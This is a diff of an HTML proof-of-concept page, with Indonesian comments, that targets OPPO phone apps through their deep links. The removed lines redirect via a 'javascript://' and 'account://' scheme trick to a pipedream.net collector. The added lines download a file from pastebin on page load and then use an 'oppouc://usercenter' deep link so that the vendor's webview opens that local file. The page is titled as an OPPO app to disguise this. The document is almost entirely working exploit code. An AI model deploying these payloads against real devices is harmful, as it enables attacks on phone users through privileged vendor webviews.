@@ -1,13 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
     <script type="text/javascript">
-        setTimeout(function(){
-            window.location.replace("javascript://%0awindow.location.replace('account://platform.usercenter.com/acWebview?url=https://eo45yctascpzo8n.m.pipedream.net');");
-        }, 2000); // 2000 milidetik = 2 detik
+        async function downloadFile(url, filename) {
+            try {
+                const response = await fetch(url);
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                const blob = await response.blob();
+                saveAs(blob, filename);
+
+                // Jika berhasil, alihkan ke URL yang diinginkan
+                window.location.replace('oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/pwned.txt');
+            } catch (error) {
+                // Menampilkan pesan kesalahan menggunakan alert
+                alert('Error during file download: ' + error.message);
+            }
+        }
+
+        window.onload = function() {
+            setTimeout(function() {
+                // Contoh penggunaan
+                downloadFile('https://pastebin.com/raw/dxbeDqv2', 'pwned.txt');
+            }, 2000); // 2000 milidetik = 2 detik
+        };
     </script>
 </head>
 <body>
-    <h1>OPPO APP MARKET</h1>
+    <h1>MY OPPO APP</h1>
+    <h1>Please Wait 2 seconds</h1>
+    
 </body>
 </html>
